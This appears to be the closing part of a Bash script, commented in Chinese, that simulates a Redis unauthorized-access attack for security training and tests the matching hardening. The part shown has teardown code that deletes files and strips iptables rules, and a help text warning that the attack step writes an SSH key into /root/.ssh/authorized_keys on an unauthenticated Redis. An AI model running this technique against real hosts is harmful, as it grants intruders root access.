  rm -rf "$VULN_DIR" "$VULN_CONF" \
    /tmp/awd_redis_vuln_web /tmp/awd_redis_vuln_cron \
    /tmp/awd_redis_vuln.pid /tmp/awd_redis_vuln.log \
    /tmp/awd_redis_orig_port.txt /tmp/awd_redis_orig_cmd.txt /tmp/awd_redis_orig_conf.bak \
    "$ATTACK_PUB_KEY" "${ATTACK_PUB_KEY%.pub}" \
    /tmp/awd_redis_backup /tmp/awd_redis_harden_out.log 2>/dev/null || true
  # 清理加固时 ip_firewall 对 6379/6380 的封端口 (只清 awd: 前缀注释的)
  iptables -S 2>/dev/null | grep -E "dpt:(6379|6380).*awd:redis_deny" | sed 's/^-A /-D /' \
    | while read rule; do iptables $rule 2>/dev/null; done

  ok "🧹 全部清理完成!"
  info "最终 Redis 状态:"
  ss -tlnp 2>/dev/null | grep redis || echo "  (无 Redis 监听)"
}

# ================================================================
# 主入口
# ================================================================
main() {
  banner
  local action="${1:-all}"
  case "$action" in
    setup)    do_setup ;;
    attack)   do_attack ;;
    harden)   do_harden ;;
    verify)   do_verify ;;
    teardown) do_teardown ;;
    all)
      do_setup
      do_attack || true
      do_harden
      do_verify || true
      do_teardown
      echo
      section "🏁 完整流程跑完! 以上就是 Redis 未授权场景 + 加固 + 验证的完整演示"
      ;;
    help|--help|-h)
      cat <<EOF
Redis 未授权访问 - 攻击场景模拟器

用法:
  sudo bash $0 setup     # 造脆弱环境
  sudo bash $0 attack    # 跑 4 种攻击 (验证漏洞环境有效)
  sudo bash $0 harden    # 跑 redis_harden.sh --auto 加固
  sudo bash $0 verify    # 攻击复现 (验证加固效果, 期望全部被挡)
  sudo bash $0 teardown  # 清理 + 恢复原 Redis
  sudo bash $0 all       # setup → attack → harden → verify → teardown 一条龙

⚠️  警告:
  * setup 会停掉本机当前 Redis 并替换为 0.0.0.0:6379 无密码监听 (仅测试)
  * attack #1 可能真的会写公钥到 /root/.ssh/authorized_keys (如存在其它 key 会 append)
  * teardown 会尝试恢复, 但务必 事后自行确认 /root/.ssh/authorized_keys 和 Redis 状态!
EOF
      ;;
    *)
      echo "未知操作: $action → 运行 $0 help"
      exit 1
      ;;
  esac
}

main "$@"
